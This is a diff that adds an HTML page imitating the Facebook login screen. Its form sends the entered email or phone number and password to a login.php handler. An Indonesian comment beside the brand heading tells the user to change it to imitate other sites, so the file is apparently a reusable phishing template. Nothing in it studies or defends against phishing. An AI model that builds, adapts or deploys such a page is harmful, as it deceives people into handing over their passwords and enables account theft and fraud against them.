@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login to Continue</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+        .login-container {
+            background-color: #fff;
+            padding: 20px 25px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
+            text-align: center;
+            width: 350px;
+        }
+        .login-container h2 {
+            color: #1877f2;
+            margin-bottom: 20px;
+            font-size: 28px;
+        }
+        .login-form input[type="text"],
+        .login-form input[type="password"] {
+            width: calc(100% - 20px);
+            padding: 12px 10px;
+            margin-bottom: 15px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 17px;
+        }
+        .login-form input[type="submit"] {
+            width: 100%;
+            padding: 12px 0;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .login-form input[type="submit"]:hover {
+            background-color: #166fe5;
+        }
+        .forgot-password {
+            margin-top: 15px;
+            font-size: 14px;
+        }
+        .forgot-password a {
+            color: #1877f2;
+            text-decoration: none;
+        }
+        .forgot-password a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <h2>Facebook</h2> <!-- Ganti ini kalo mau niru situs lain -->
+        <form action="login.php" method="POST" class="login-form">
+            <input type="text" name="email" placeholder="Email address or phone number" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <input type="submit" value="Log In">
+        </form>
+        <div class="forgot-password">
+            <a href="#">Forgotten password?</a>
+        </div>
+    </div>
+</body>
+</html>
